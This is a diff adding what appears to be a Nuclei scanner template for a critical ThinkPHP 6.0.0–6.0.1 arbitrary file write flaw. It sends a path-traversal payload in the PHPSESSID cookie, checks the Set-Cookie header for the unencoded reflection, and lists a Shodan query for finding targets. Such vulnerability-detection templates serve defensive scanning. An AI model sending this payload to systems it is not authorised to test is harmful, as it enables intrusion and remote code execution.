@@ -1,0 +1,37 @@
+id: thinkphp6-arbitrary-write
+info:
+  author: arliya
+  description: ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker
+    can upload any script file through this vulnerability to realize remote code execution
+    takeover.We inject payload into PHPSESSID. In the buggy version, the payload is
+    url encoded and returned as it is. In the fixed version, the payload is returned
+    as a 32-bit hexadecimal string
+  metadata:
+    shodan-query: title:"ThinkPHP"
+    verified: true
+  name: ThinkPHP 6.0.0~6.0.1 - Arbitrary file write
+  reference: '- https://community.f5.com/t5/technical-articles/thinkphp-6-0-0-6-0-1-arbitrary-file-write-vulnerability/ta-p/281591
+
+    - https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write
+
+    '
+  severity: critical
+  tags: thinkphp,file-upload,rce
+requests:
+- headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=/../../../public/{{random_filename}}.php
+  matchers:
+  - part: header
+    type: word
+    words:
+    - 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/'
+variables:
+  random_filename: '{{to_lower(rand_base(11))}}'
